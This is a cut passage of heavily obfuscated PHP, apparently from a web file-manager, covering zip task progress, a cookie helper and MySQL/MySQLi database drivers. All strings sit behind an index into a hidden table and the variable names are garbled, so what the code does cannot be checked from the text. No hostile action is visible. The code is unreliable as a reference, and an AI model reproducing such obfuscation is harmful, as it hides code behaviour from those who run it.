$õ„ÏÂ†Ÿ[382]) { return; } } if ($õêí©›·[$õ„ÏÂ†Ÿ[1879]] == $õ„ÏÂ†Ÿ[1254]) { $–¨Ÿğõç = 0; if ($õêí©›·[$õ„ÏÂ†Ÿ[1814]]) { $–¨Ÿğõç = $õêí©›·[$õ„ÏÂ†Ÿ[1815]] / $õêí©›·[$õ„ÏÂ†Ÿ[1814]]; } $õêí©›·[$õ„ÏÂ†Ÿ[1763]] = $–¨Ÿğõç * 0.3; } else { if ($õêí©›·[$õ„ÏÂ†Ÿ[1879]] == $õ„ÏÂ†Ÿ[382]) { $–¨Ÿğõç = $õêí©›·[$õ„ÏÂ†Ÿ[1762]] / $õêí©›·[$õ„ÏÂ†Ÿ[1116]]; $õêí©›·[$õ„ÏÂ†Ÿ[1763]] = 0.3 + $–¨Ÿğõç * 0.4; } else { if ($õêí©›·[$õ„ÏÂ†Ÿ[1879]] == $õ„ÏÂ†Ÿ[120]) { $ğƒƒœĞ = 0; if ($õêí©›·[$õ„ÏÂ†Ÿ[1816]] == $õ„ÏÂ†Ÿ[120]) { $ğƒƒœĞ = $õêí©›·[$õ„ÏÂ†Ÿ[1815]]; } $–¨Ÿğõç = ($õêí©›·[$õ„ÏÂ†Ÿ[1819]] + $ğƒƒœĞ) / $õêí©›·[$õ„ÏÂ†Ÿ[817]]; $õêí©›·[$õ„ÏÂ†Ÿ[1763]] = 0.3 + 0.4 + $–¨Ÿğõç * 0.3; } } } if ($õêí©›·[$õ„ÏÂ†Ÿ[1763]] > 0) { $ÆµíÜ¹Ñ = timeFloat() - $õêí©›·[$õ„ÏÂ†Ÿ[1765]] - $õêí©›·[$õ„ÏÂ†Ÿ[1768]]; $õêí©›·[$õ„ÏÂ†Ÿ[1769]] = $ÆµíÜ¹Ñ * (1 - $õêí©›·[$õ„ÏÂ†Ÿ[1763]]) / $õêí©›·[$õ„ÏÂ†Ÿ[1763]]; } } public function addFile($¥€›‹óò) { $ÒÒ«¤ğª =& $_SERVER[è¶³ÒßÑ]; $¹ÜûºŒ¨ =& $this->task; $‡ˆäÙúÌ = IO::info($¥€›‹óò); $¹ÜûºŒ¨[$ÒÒ«¤ğª[1812]] = $‡ˆäÙúÌ[$ÒÒ«¤ğª[32]]; $¹ÜûºŒ¨[$ÒÒ«¤ğª[1814]] = $‡ˆäÙúÌ[$ÒÒ«¤ğª[89]]; $¹ÜûºŒ¨[$ÒÒ«¤ğª[1815]] = 0; $¹ÜûºŒ¨[$ÒÒ«¤ğª[1118]] = $ÒÒ«¤ğª[1835]; $¹ÜûºŒ¨[$ÒÒ«¤ğª[1816]] = $ÒÒ«¤ğª[1254]; $¹ÜûºŒ¨[$ÒÒ«¤ğª[817]] = $‡ˆäÙúÌ[$ÒÒ«¤ğª[89]]; $¹ÜûºŒ¨[$ÒÒ«¤ğª[1116]] = 1; $ïÇèá® = 0; $¹ÜûºŒ¨[$ÒÒ«¤ğª[1823]] = array($ÒÒ«¤ğª[1824] => $ïÇèá® + 1, $ÒÒ«¤ğª[487] => $‡ˆäÙúÌ[$ÒÒ«¤ğª[32]], $ÒÒ«¤ğª[97] => $‡ˆäÙúÌ[$ÒÒ«¤ğª[97]], $ÒÒ«¤ğª[575] => $‡ˆäÙúÌ[$ÒÒ«¤ğª[575]] ? $‡ˆäÙúÌ[$ÒÒ«¤ğª[575]] : $‡ˆäÙúÌ[$ÒÒ«¤ğª[97]]); $this->update(); } public function zipEvent($òÍÍ¡ÊÚ, $Ù£İˆÔ†, $·Î°‹úÄ, $·‡Ã»Ÿ¥) { $²¯ı¯¯§ =& $_SERVER[è¶³ÒßÑ]; $°ŸË¬‘§ =& $this->task; $°ŸË¬‘§[$²¯ı¯¯§[1812]] = get_path_this($Ù£İˆÔ†); $°ŸË¬‘§[$²¯ı¯¯§[1814]] = $·‡Ã»Ÿ¥; $°ŸË¬‘§[$²¯ı¯¯§[1815]] = $·Î°‹úÄ; $°ŸË¬‘§[$²¯ı¯¯§[1118]] = $òÍÍ¡ÊÚ == $²¯ı¯¯§[1881] ? $²¯ı¯¯§[1882] : $²¯ı¯¯§[1883]; $°ŸË¬‘§[$²¯ı¯¯§[1816]] = $²¯ı¯¯§[12]; $°ŸË¬‘§[$²¯ı¯¯§[817]] = $·‡Ã»Ÿ¥; $°ŸË¬‘§[$²¯ı¯¯§[1879]] = $²¯ı¯¯§[382]; $this->update(); } public function unzipAfter($Å›ìŸ) { $óŸ›§Ø£ =& $_SERVER[è¶³ÒßÑ]; $÷ê¹ÇŠ‘ =& $this->task; $÷ê¹ÇŠ‘[$óŸ›§Ø£[1879]] = $óŸ›§Ø£[120]; $¦«ÆÁÁô = IO::infoWithChildren($Å›ìŸ); $ùç™û‘Í = 0; $÷ê¹ÇŠ‘[$óŸ›§Ø£[1823]] = array($óŸ›§Ø£[1824] => $ùç™û‘Í + 1, $óŸ›§Ø£[487] => $¦«ÆÁÁô[$óŸ›§Ø£[32]], $óŸ›§Ø£[97] => $¦«ÆÁÁô[$óŸ›§Ø£[97]], $óŸ›§Ø£[575] => $¦«ÆÁÁô[$óŸ›§Ø£[575]] ? $¦«ÆÁÁô[$óŸ›§Ø£[575]] : $¦«ÆÁÁô[$óŸ›§Ø£[97]]); if ($¦«ÆÁÁô[$óŸ›§Ø£[33]] == $óŸ›§Ø£[240]) { $÷ê¹ÇŠ‘[$óŸ›§Ø£[1116]] = 1; } else { $÷ê¹ÇŠ‘[$óŸ›§Ø£[1116]] = $¦«ÆÁÁô[$óŸ›§Ø£[92]][$óŸ›§Ø£[90]]; } $÷ê¹ÇŠ‘[$óŸ›§Ø£[1118]] = $óŸ›§Ø£[12]; $÷ê¹ÇŠ‘[$óŸ›§Ø£[1816]] = 0; $÷ê¹ÇŠ‘[$óŸ›§Ø£[1762]] = 0; $÷ê¹ÇŠ‘[$óŸ›§Ø£[1814]] = 0; $÷ê¹ÇŠ‘[$óŸ›§Ø£[1815]] = 0; $÷ê¹ÇŠ‘[$óŸ›§Ø£[1812]] = $óŸ›§Ø£[12]; $÷ê¹ÇŠ‘[$óŸ›§Ø£[1819]] = 0; $÷ê¹ÇŠ‘[$óŸ›§Ø£[817]] = $¦«ÆÁÁô[$óŸ›§Ø£[89]]; $this->update(); self::log($óŸ›§Ø£[1884] . json_encode(array($÷ê¹ÇŠ‘, $¦«ÆÁÁô))); } public function nameParse($¢Áşªà) { $µ¦É¬ =& $_SERVER[è¶³ÒßÑ]; $€¦©Ó–û =& $this->task; if ($€¦©Ó–û[$µ¦É¬[1879]] == $µ¦É¬[1254]) { $€¦©Ó–û[$µ¦É¬[1879]] = $µ¦É¬[382]; $€¦©Ó–û[$µ¦É¬[1819]] = 0; $€¦©Ó–û[$µ¦É¬[817]] = 0; } $à†ÏáÅ = get_path_this($¢Áşªà); if (strstr($à†ÏáÅ, $µ¦É¬[10])) { $€¦©Ó–û[$µ¦É¬[1762]] += 1; $€¦©Ó–û[$µ¦É¬[1116]] += 1; } $€¦©Ó–û[$µ¦É¬[1812]] = $¢Áşªà; $this->update(); } } class TaskZip extends TaskFileTransfer { protected function startAfter() { $¸Ëôã©² =& $_SERVER[è¶³ÒßÑ]; parent::startAfter(); Hook::bind($¸Ëôã©²[1885], array($this, $¸Ëôã©²[1875])); Hook::bind($¸Ëôã©²[1877], array($this, $¸Ëôã©²[1878])); $ùÀ©ÕÎ‹ =& $this->task; $ùÀ©ÕÎ‹[$¸Ëôã©²[1879]] = $¸Ëôã©²[1254]; if (!$ùÀ©ÕÎ‹[$¸Ëôã©²[1650]]) { $ùÀ©ÕÎ‹[$¸Ëôã©²[1650]] = LNG($¸Ëôã©²[1886]); } } protected function endAfter() { $÷ËÜğÙÂ =& $_SERVER[è¶³ÒßÑ]; parent::endAfter(); Hook::unbind($÷ËÜğÙÂ[1885], array($this, $÷ËÜğÙÂ[1875])); Hook::unbind($÷ËÜğÙÂ[1877], array($this, $÷ËÜğÙÂ[1878])); } public function updateAfter() { $Àõñ¡û =& $_SERVER[è¶³ÒßÑ]; $ÌˆéÖì¼ =& $this->task; if (!$ÌˆéÖì¼[$Àõñ¡û[1116]] || !$ÌˆéÖì¼[$Àõñ¡û[817]]) { return; } if ($ÌˆéÖì¼[$Àõñ¡û[1879]] == $Àõñ¡û[1254]) { $ŠÌáœåû = $ÌˆéÖì¼[$Àõñ¡û[1815]]; if ($ÌˆéÖì¼[$Àõñ¡û[1816]] != $Àõñ¡û[1254]) { $ŠÌáœåû = 0; } $©›Øô¤¿ = ($ÌˆéÖì¼[$Àõñ¡û[1819]] + $ŠÌáœåû) / $ÌˆéÖì¼[$Àõñ¡û[817]]; $ÌˆéÖì¼[$Àõñ¡û[1763]] = $©›Øô¤¿ * 0.3; } else { if ($ÌˆéÖì¼[$Àõñ¡û[1879]] == $Àõñ¡û[382]) { $©›Øô¤¿ = $ÌˆéÖì¼[$Àõñ¡û[1762]] / $ÌˆéÖì¼[$Àõñ¡û[1116]]; $ÌˆéÖì¼[$Àõñ¡û[1763]] = 0.3 + $©›Øô¤¿ * 0.5; } else { if ($ÌˆéÖì¼[$Àõñ¡û[1879]] == $Àõñ¡û[120]) { $©›Øô¤¿ = 0; if ($ÌˆéÖì¼[$Àõñ¡û[1814]]) { $©›Øô¤¿ = $ÌˆéÖì¼[$Àõñ¡û[1815]] / $ÌˆéÖì¼[$Àõñ¡û[1814]]; } $ÌˆéÖì¼[$Àõñ¡û[1763]] = 0.3 + 0.5 + $©›Øô¤¿ * 0.2; } } } if ($ÌˆéÖì¼[$Àõñ¡û[1763]] > 0) { $¯èœÄÂ’ = timeFloat() - $ÌˆéÖì¼[$Àõñ¡û[1765]] - $ÌˆéÖì¼[$Àõñ¡û[1768]]; $ÌˆéÖì¼[$Àõñ¡û[1769]] = $¯èœÄÂ’ * (1 - $ÌˆéÖì¼[$Àõñ¡û[1763]]) / $ÌˆéÖì¼[$Àõñ¡û[1763]]; } } public function copyFileStart($âĞÏ¸š, $Ìå¸’€¡, $ÊÈãˆ², $§üÜ…Õö, $Ó»²ëÙÎ, $æÎ«™ã†) { $ßÆ®­÷÷ =& $_SERVER[è¶³ÒßÑ]; parent::copyFileStart($âĞÏ¸š, $Ìå¸’€¡, $ÊÈãˆ², $§üÜ…Õö, $Ó»²ëÙÎ, $æÎ«™ã†); $‹¬ˆÜâÁ =& $this->task; if ($‹¬ˆÜâÁ[$ßÆ®­÷÷[1879]] == $ßÆ®­÷÷[382]) { $‹¬ˆÜâÁ[$ßÆ®­÷÷[1879]] = $ßÆ®­÷÷[120]; } $this->update(); } public function copyFileEnd($Ú”Õ¥›ˆ, $È²å¹ïÀ, $˜Ì®óı, $ïóÕşı, $Ì¢ÉĞñ¶, $ÉŞ˜„ãâ) { $›©é¬Î =& $_SERVER[è¶³ÒßÑ]; $ÈÍàÀí =& $this->task; $ÈÍàÀí[$›©é¬Î[1815]] = $ÈÍàÀí[$›©é¬Î[1814]]; $ÈÍàÀí[$›©é¬Î[1819]] += $ÈÍàÀí[$›©é¬Î[1814]]; $ÈÍàÀí[$›©é¬Î[1816]] = $›©é¬Î[12]; $this->update(); } public function zipEvent($Î…ÜİØ¤, $ÇÆ´ÒÏ, $ãûì¸¦, $úòé œÉ) { $ÀÍµé =& $_SERVER[è¶³ÒßÑ]; $Ìü‡ =& $this->task; $Ìü‡[$ÀÍµé[1812]] = get_path_this($ÇÆ´ÒÏ); $Ìü‡[$ÀÍµé[1814]] = $úòé œÉ; $Ìü‡[$ÀÍµé[1815]] = $ãûì¸¦; $Ìü‡[$ÀÍµé[1118]] = $Î…ÜİØ¤ == $ÀÍµé[1887] ? $ÀÍµé[1882] : $ÀÍµé[1883]; $Ìü‡[$ÀÍµé[1816]] = $ÀÍµé[12]; $Ìü‡[$ÀÍµé[817]] = $úòé œÉ; $Ìü‡[$ÀÍµé[1879]] = $ÀÍµé[382]; $this->update(); } public function nameParse($œ«‹õ«á) { $óÍæ¹É” =& $_SERVER[è¶³ÒßÑ]; $§ÓµÈ— =& $this->task; if ($§ÓµÈ—[$óÍæ¹É”[1762]] < $§ÓµÈ—[$óÍæ¹É”[1116]]) { $˜ã±ñ«¯ = get_path_this($œ«‹õ«á); if (strstr($˜ã±ñ«¯, $óÍæ¹É”[10])) { $§ÓµÈ—[$óÍæ¹É”[1762]] += 1; } } if ($§ÓµÈ—[$óÍæ¹É”[1879]] == $óÍæ¹É”[1254]) { $§ÓµÈ—[$óÍæ¹É”[1879]] = $óÍæ¹É”[382]; } $§ÓµÈ—[$óÍæ¹É”[1812]] = $œ«‹õ«á; $this->update(); } } goto E‹›‹’Ô‹; A±©èô‚Œ³: class Cookie { private $prefix = ''; private $expire = 3600; public function __construct($ü¢ê¹º° = '', $Ïı„½­ = 0) { if (is_string($ü¢ê¹º°) && $ü¢ê¹º° != $_SERVER[è¶³ÒßÑ][12]) { $this->prefix = $ü¢ê¹º°; } if (is_numeric($Ïı„½­) && $Ïı„½­ > 0) { $this->expire = $Ïı„½­; } } public static function getInstance() { static $¬´ÂıÜé; if ($¬´ÂıÜé === null) { $¬´ÂıÜé = new self(); } return $¬´ÂıÜé; } private static $cookieDisable = false; public static function disable($äˆã¨„¦) { self::$cookieDisable = $äˆã¨„¦; } private static $sameCookieSet = array(); public static function set($Ë¼Ş»¦È, $°ÄšÆû, $Ôà³³”— = 0, $Çáâ­öï = false, $‡ÚÕé¤§ = false) { $ÕûÔÏ“£ =& $_SERVER[è¶³ÒßÑ]; if (self::$cookieDisable) { return; } if (!$Ôà³³”—) { $Ôà³³”— = 24 * 3600 * 7; } if (isset(self::$sameCookieSet[$Ë¼Ş»¦È]) && self::$sameCookieSet[$Ë¼Ş»¦È] == $°ÄšÆû . $Ôà³³”—) { return; } self::$sameCookieSet[$Ë¼Ş»¦È] = $°ÄšÆû . $Ôà³³”—; if (!$‡ÚÕé¤§) { $‡ÚÕé¤§ = str_replace(HOST, $ÕûÔÏ“£[12], APP_HOST); $‡ÚÕé¤§ = _get($GLOBALS, $ÕûÔÏ“£[935], $‡ÚÕé¤§); } $ûğÈ·¹Ô = $ÕûÔÏ“£[12]; setcookie($Ë¼Ş»¦È, $°ÄšÆû, time() + $Ôà³³”—, $ÕûÔÏ“£[8] . trim($‡ÚÕé¤§, $ÕûÔÏ“£[8]) . $ûğÈ·¹Ô, !1, !1, $Çáâ­öï); } public static function setSafe($ï¼ªµÆ, $Îü¶·, $ØğÎò‘© = 0) { self::set($ï¼ªµÆ, $Îü¶·, $ØğÎò‘©, !0); } public static function get($¶è€çÑû) { static $ş¶äÌĞš = false; if (!$ş¶äÌĞš) { self::initHeaderCookie(); $ş¶äÌĞš = !0; } return isset($_COOKIE[$¶è€çÑû]) ? $_COOKIE[$¶è€çÑû] : !1; } private static function initHeaderCookie() { $”‘ë˜”Õ =& $_SERVER[è¶³ÒßÑ]; if (!isset($_SERVER[$”‘ë˜”Õ[936]]) || !$_SERVER[$”‘ë˜”Õ[936]]) { return; } $¬€Ñõ×İ = explode($”‘ë˜”Õ[84], $_SERVER[$”‘ë˜”Õ[936]]); foreach ($¬€Ñõ×İ as $ç³±³ª‰) { $ç³±³ª‰ = explode($”‘ë˜”Õ[937], $ç³±³ª‰); if (count($ç³±³ª‰) != 2 || !isset($ç³±³ª‰[1])) { continue; } $_COOKIE[trim($ç³±³ª‰[0])] = trim($ç³±³ª‰[1]); } } public static function remove($íÙÕÚòƒ, $Û°’óºš = false) { unset($_COOKIE[$íÙÕÚòƒ]); self::set($íÙÕÚòƒ, $_SERVER[è¶³ÒßÑ][12], 1, $Û°’óºš); } } class DbMysql extends Db { public function __construct($öœÕ·‚ = '') { $¢‡áÊî˜ =& $_SERVER[è¶³ÒßÑ]; if (!extension_loaded($¢‡áÊî˜[858])) { think_exception(think_lang($¢‡áÊî˜[14]) . $¢‡áÊî˜[938]); } if (!empty($öœÕ·‚)) { $this->config = $öœÕ·‚; if (empty($this->config[$¢‡áÊî˜[17]])) { $this->config[$¢‡áÊî˜[17]] = $¢‡áÊî˜[12]; } } } public function connect($ğ‘„Ş¿À = '', $±ÙÕø¨§ = 0, $Õº¥®õâ = false) { $”Ş¦®õµ =& $_SERVER[è¶³ÒßÑ]; if (!isset($this->linkID[$±ÙÕø¨§])) { if (empty($ğ‘„Ş¿À)) { $ğ‘„Ş¿À = $this->config; } $ÅÏÎ¥¾é = $ğ‘„Ş¿À[$”Ş¦®õµ[939]] . ($ğ‘„Ş¿À[$”Ş¦®õµ[940]] ? "\72{$ğ‘„Ş¿À[$”Ş¦®õµ[940]]}" : $”Ş¦®õµ[12]); $ÀËõÖ• = !empty($ğ‘„Ş¿À[$”Ş¦®õµ[17]][$”Ş¦®õµ[18]]) ? $ğ‘„Ş¿À[$”Ş¦®õµ[17]][$”Ş¦®õµ[18]] : $this->pconnect; if ($ÀËõÖ•) { $this->linkID[$±ÙÕø¨§] = mysql_pconnect($ÅÏÎ¥¾é, $ğ‘„Ş¿À[$”Ş¦®õµ[941]], $ğ‘„Ş¿À[$”Ş¦®õµ[942]], 131072); } else { $this->linkID[$±ÙÕø¨§] = mysql_connect($ÅÏÎ¥¾é, $ğ‘„Ş¿À[$”Ş¦®õµ[941]], $ğ‘„Ş¿À[$”Ş¦®õµ[942]], !0, 131072); } if (!$this->linkID[$±ÙÕø¨§] || !empty($ğ‘„Ş¿À[$”Ş¦®õµ[21]]) && !mysql_select_db($ğ‘„Ş¿À[$”Ş¦®õµ[21]], $this->linkID[$±ÙÕø¨§])) { think_exception(mysql_error()); } $Ê¬Á = mysql_get_server_info($this->linkID[$±ÙÕø¨§]); mysql_query($”Ş¦®õµ[943] . think_config($”Ş¦®õµ[944]) . $”Ş¦®õµ[68], $this->linkID[$±ÙÕø¨§]); if ($Ê¬Á > $”Ş¦®õµ[945]) { mysql_query($”Ş¦®õµ[946], $this->linkID[$±ÙÕø¨§]); } $this->connected = !0; if (1 != think_config($”Ş¦®õµ[22])) { unset($this->config); } } return $this->linkID[$±ÙÕø¨§]; } public function free() { mysql_free_result($this->queryID); $this->queryID = null; } public function query($¹ËÙˆŒû) { $­şúí =& $_SERVER[è¶³ÒßÑ]; if (0 === stripos($¹ËÙˆŒû, $­şúí[334])) { $this->close(); $this->connected = !1; } $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $¹ËÙˆŒû; if ($this->queryID) { $this->free(); } think_action_status($­şúí[23], 1); think_status($­şúí[24]); $this->queryID = mysql_query($¹ËÙˆŒû, $this->_linkID); $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = mysql_num_rows($this->queryID); return $this->getAll(); } } public function execute($Ş¹íÀ´) { $òÄëö×Ñ =& $_SERVER[è¶³ÒßÑ]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $Ş¹íÀ´; if ($this->queryID) { $this->free(); } think_action_status($òÄëö×Ñ[25], 1); think_status($òÄëö×Ñ[24]); $ĞØœé˜ö = mysql_query($Ş¹íÀ´, $this->_linkID); $this->debug(); if (!1 === $ĞØœé˜ö) { $this->error(); return !1; } else { $this->numRows = mysql_affected_rows($this->_linkID); $this->lastInsID = mysql_insert_id($this->_linkID); return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { mysql_query($_SERVER[è¶³ÒßÑ][947], $this->_linkID); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $ºø´€³ = mysql_query($_SERVER[è¶³ÒßÑ][948], $this->_linkID); $this->transTimes = 0; if (!$ºø´€³) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $â‰å¬ŒÜ = mysql_query($_SERVER[è¶³ÒßÑ][949], $this->_linkID); $this->transTimes = 0; if (!$â‰å¬ŒÜ) { $this->error(); return !1; } } return !0; } private function getAll() { $£·îí± = array(); if ($this->numRows > 0) { while ($¯œª¦Æñ = mysql_fetch_assoc($this->queryID)) { $£·îí±[] = $¯œª¦Æñ; } mysql_data_seek($this->queryID, 0); } return $£·îí±; } public function getFields($ß¬ª¸ßş) { $ş§©´áÁ =& $_SERVER[è¶³ÒßÑ]; $Şú‘ƒÄ = $this->query($ş§©´áÁ[950] . $this->parseKey($ß¬ª¸ßş)); $Ó¥±Ó = array(); if ($Şú‘ƒÄ) { foreach ($Şú‘ƒÄ as $¾­‚òÛÒ => $ÔÛ±˜¢¼) { $Ó¥±Ó[$ÔÛ±˜¢¼[$ş§©´áÁ[31]]] = array($ş§©´áÁ[32] => $ÔÛ±˜¢¼[$ş§©´áÁ[31]], $ş§©´áÁ[33] => $ÔÛ±˜¢¼[$ş§©´áÁ[34]], $ş§©´áÁ[35] => (bool) (strtoupper($ÔÛ±˜¢¼[$ş§©´áÁ[36]]) === $ş§©´áÁ[951]), $ş§©´áÁ[37] => $ÔÛ±˜¢¼[$ş§©´áÁ[38]], $ş§©´áÁ[39] => strtolower($ÔÛ±˜¢¼[$ş§©´áÁ[40]]) == $ş§©´áÁ[41], $ş§©´áÁ[42] => strtolower($ÔÛ±˜¢¼[$ş§©´áÁ[43]]) == $ş§©´áÁ[44]); } } return $Ó¥±Ó; } public function getTables($…ùÇƒ™õ = '') { $†Ï¢¤†İ =& $_SERVER[è¶³ÒßÑ]; if (!empty($…ùÇƒ™õ)) { $…óØâÜÒ = $†Ï¢¤†İ[952] . $…ùÇƒ™õ . $†Ï¢¤†İ[953]; } else { $…óØâÜÒ = $†Ï¢¤†İ[954]; } $•˜ïùçÂ = $this->query($…óØâÜÒ); $û…Ü•ĞÒ = array(); foreach ($•˜ïùçÂ as $ª‹ïğõÏ => $õŸÇóÂĞ) { $û…Ü•ĞÒ[$ª‹ïğõÏ] = current($õŸÇóÂĞ); } return $û…Ü•ĞÒ; } public function replace($±¤¸›óª, $ùèáŸä = array()) { $†šêÅ° =& $_SERVER[è¶³ÒßÑ]; foreach ($±¤¸›óª as $ÑõİÊĞ => $Ü¹ü àà) { $ó§òœ¥£ = $this->parseValue($Ü¹ü àà); if (is_scalar($ó§òœ¥£)) { $¿•ú¸ò”[] = $ó§òœ¥£; $Š“Ğæëğ[] = $this->parseKey($ÑõİÊĞ); } } $ğÕâ»æ³ = $†šêÅ°[955] . $this->parseTable($ùèáŸä[$†šêÅ°[349]]) . $†šêÅ°[956] . implode($†šêÅ°[50], $Š“Ğæëğ) . $†šêÅ°[957] . implode($†šêÅ°[50], $¿•ú¸ò”) . $†šêÅ°[958]; return $this->execute($ğÕâ»æ³); } public function insertAll($œœ‡Åïï, $Î«¬ò°³ = array(), $Êğ•ÜâÍ = false) { $È Íà°¢ =& $_SERVER[è¶³ÒßÑ]; if (!is_array($œœ‡Åïï[0])) { return !1; } $½„ıøÕ× = array_keys($œœ‡Åïï[0]); $°÷â°¬ = array(); foreach ($œœ‡Åïï as $ĞÁ‡ö¬) { $³ôú‹ß‚ = array(); foreach ($ĞÁ‡ö¬ as $À²ÈÖÅÕ => $û½ã›ò–) { $û½ã›ò– = $this->parseValue($û½ã›ò–); if (is_scalar($û½ã›ò–)) { $³ôú‹ß‚[] = $û½ã›ò–; } } $°÷â°¬[] = $È Íà°¢[330] . implode($È Íà°¢[50], $³ôú‹ß‚) . $È Íà°¢[958]; } array_walk($½„ıøÕ×, array($this, $È Íà°¢[959])); $ç´È‘ë‚ = ($Êğ•ÜâÍ ? $È Íà°¢[960] : $È Íà°¢[961]) . $È Íà°¢[962] . $this->parseTable($Î«¬ò°³[$È Íà°¢[349]]) . $È Íà°¢[956] . implode($È Íà°¢[50], $½„ıøÕ×) . $È Íà°¢[963] . implode($È Íà°¢[50], $°÷â°¬); return $this->execute($ç´È‘ë‚); } public function close() { if ($this->_linkID) { mysql_close($this->_linkID); } $this->_linkID = null; } public function error() { $„€åÌÑ‰ =& $_SERVER[è¶³ÒßÑ]; $this->error = mysql_errno() . $„€åÌÑ‰[4] . mysql_error($this->_linkID); if ($„€åÌÑ‰[12] != $this->queryStr) { $this->error .= LNG($„€åÌÑ‰[48]) . $this->queryStr; } think_trace($this->error, $„€åÌÑ‰[12], $„€åÌÑ‰[49]); return $this->error; } public function escapeString($êú‚öı°) { if ($this->_linkID) { return mysql_real_escape_string($êú‚öı°, $this->_linkID); } else { return mysql_escape_string($êú‚öı°); } } public function parseKey(&$¢û…ûö», $ÊÂìöÌ© = true) { $…ô–´´û =& $_SERVER[è¶³ÒßÑ]; if ($ÊÂìöÌ©) { $¢û…ûö» = $this->parseKeyCheck($¢û…ûö»); } if ($¢û…ûö» != $…ô–´´û[230] && !preg_match($…ô–´´û[964], $¢û…ûö»)) { $¢û…ûö» = $…ô–´´û[454] . trim($¢û…ûö», $…ô–´´û[454]) . $…ô–´´û[454]; } return $¢û…ûö»; } } class DbMysqli extends Db { public function __construct($œ«õÉ©ì = '') { $Ó’²…• =& $_SERVER[è¶³ÒßÑ]; if (!extension_loaded($Ó’²…•[965])) { think_exception(think_lang($Ó’²…•[14]) . $Ó’²…•[966]); } if (!empty($œ«õÉ©ì)) { $this->config = $œ«õÉ©ì; if (empty($this->config[$Ó’²…•[17]])) { $this->config[$Ó’²…•[17]] = $Ó’²…•[12]; } } } public function connect($ø˜¹öß = '', $ßïÃµµà = 0) { $³ ‰ª‹ =& $_SERVER[è¶³ÒßÑ]; if (!isset($this->linkID[$ßïÃµµà])) { if (empty($ø˜¹öß)) { $ø˜¹öß = $this->config; } $this->linkID[$ßïÃµµà] = new mysqli($ø˜¹öß[$³ ‰ª‹[939]], $ø˜¹öß[$³ ‰ª‹[941]], $ø˜¹öß[$³ ‰ª‹[942]], $ø˜¹öß[$³ ‰ª‹[21]], $ø˜¹öß[$³ ‰ª‹[940]] ? intval($ø˜¹öß[$³ ‰ª‹[940]]) : 3306); if (mysqli_connect_errno()) { think_exception(mysqli_connect_error()); } $¿ğã«‡ì = $this->linkID[$ßïÃµµà]->server_version; $this->linkID[$ßïÃµµà]->query($³ ‰ª‹[943] . think_config($³ ‰ª‹[944]) . $³ ‰ª‹[68]); if ($¿ğã«‡ì > $³ ‰ª‹[945]) { $this->linkID[$ßïÃµµà]->query($³ ‰ª‹[946]); } $this->connected = !0; if (1 != think_config($³ ‰ª‹[22])) { unset($this->config); } } return $this->linkID[$ßïÃµµà]; } public function free() { $this->queryID->free_result(); $this->queryID = null; } public function query($÷”¶’ğÅ) { $ÒÑ•¸©ø =& $_SERVER[è¶³ÒßÑ]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $÷”¶’ğÅ; if ($this->queryID) { $this->free(); } think_action_status($ÒÑ•¸©ø[23], 1); think_status($ÒÑ•¸©ø[24]); $this->queryID = $this->_linkID->query($÷”¶’ğÅ); if ($this->_linkID->more_results()) { while (($ë¡¢£²á = $this->_linkID->next_result()) != NULL) { $ë¡¢£²á->free_result(); } } $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = $this->queryID->num_rows; $this->numCols = $this->queryID->field_count; return $this->getAll(); } } public function execute($ÛŒÌÈ÷) { $¸î×Ôî =& $_SERVER[è¶³ÒßÑ]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $ÛŒÌÈ÷; if ($this->queryID) { $this->free(); } think_action_status($¸î×Ôî[25], 1); think_status($¸î×Ôî[24]); $¶§Ğ©‰ = $this->_linkID->query($ÛŒÌÈ÷); $this->debug(); if (!1 === $¶§Ğ©‰) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->affected_rows; $this->lastInsID = $this->_linkID->insert_id; return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if ($this->transTimes == 0) { $this->_linkID->autocommit(!1); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $²«»Å™ = $this->_linkID->commit(); $this->_linkID->autocommit(!0); $this->transTimes = 0; if (!$²«»Å™) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $èØÆæÔ¥ = $this->_linkID->rollback(); $this->transTimes = 0; if (!$èØÆæÔ¥) { $this->error(); return !1; } } return !0; } private function getAll() { $¬¸•ŠĞ¢ = array(); if ($this->numRows > 0) { for ($„ÃòµÅ = 0; $„ÃòµÅ < $this->numRows; $„ÃòµÅ++) { $¬¸•ŠĞ¢[$„ÃòµÅ] = $this->queryID->fetch_assoc(); } $this->queryID->data_seek(0); } return $¬¸•ŠĞ¢; } public function getFields($†ØöÛôò) { $Ö“™÷¤š =& $_SERVER[è¶³ÒßÑ]; $ÉçÛ½¦€ = $this->query($Ö“™÷¤š[950] . $this->parseKey($†ØöÛôò)); $¹¸¡‘ = array(); if ($ÉçÛ½¦€) { foreach ($ÉçÛ½¦€ as $ºò³áÊ => $‚’ş³Ú¹) { $¹¸¡‘[$‚’ş³Ú¹[$Ö“™÷¤š[31]]] = array($Ö“™÷¤š[32] => $‚’ş³Ú¹[$Ö“™÷¤š[31]], $Ö“™÷¤š[33] => $‚’ş³Ú¹[$Ö“™÷¤š[34]], $Ö“™÷¤š[35] => (bool) ($‚’ş³Ú¹[$Ö“™÷¤š[36]] === $Ö“™÷¤š[12]), $Ö“™÷¤š[37] => $‚’ş³Ú¹[$Ö“™÷¤š[38]], $Ö“™÷¤š[39] => strtolower($‚’ş³Ú¹[$Ö“™÷¤š[40]]) == $Ö“™÷¤š[41], $Ö“™÷¤š[42] => strtolower($‚’ş³Ú¹[$Ö“™÷¤š[43]]) == $Ö“™÷¤š[44]); } } return $¹¸¡‘; } public function getTables($åŸ‹Üš = '') { $æ’¡‡ŞË =& $_SERVER[è¶³ÒßÑ]; $†¯©Éû¶ = !empty($åŸ‹Üš) ? $æ’¡‡ŞË[952] . $åŸ‹Üš . $æ’¡‡ŞË[953] : $æ’¡‡ŞË[954]; $¥¥ã³ = $this->query($†¯©Éû¶); 